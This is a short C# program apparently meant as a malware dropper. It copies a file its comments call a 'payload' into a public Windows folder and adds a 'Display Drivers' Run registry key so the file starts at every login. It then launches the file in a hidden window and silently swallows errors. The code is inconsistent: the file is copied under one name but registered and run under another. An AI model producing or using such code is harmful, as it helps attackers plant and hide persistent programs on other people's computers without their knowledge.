using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Diagnostics;
using System.IO;

namespace hideconsole
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string targetPath = @"C:\Users\Public\System\";                
                if (!System.IO.Directory.Exists(targetPath))
                {
                    System.IO.Directory.CreateDirectory(targetPath);
                }
                File.Copy("your-file-name.exe", targetPath + "some-authentic-name.exe", true); // Copies another executable/payload to system directory
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);//adds executable file to registery to ensure execution at windows start up
                key.SetValue("Display Drivers", targetPath + @"DisplayDriver.exe"); //registery is created with this value
                Process proc = new Process();
                proc.StartInfo.FileName = Path.Combine(targetPath + "DisplayDriver.exe"); 
                proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; // hides application 
                proc.StartInfo.CreateNoWindow = true;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.UseShellExecute = false;
                proc.Start();    
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.ToString());
            }
            //Console.ReadKey();

        }
    }
}
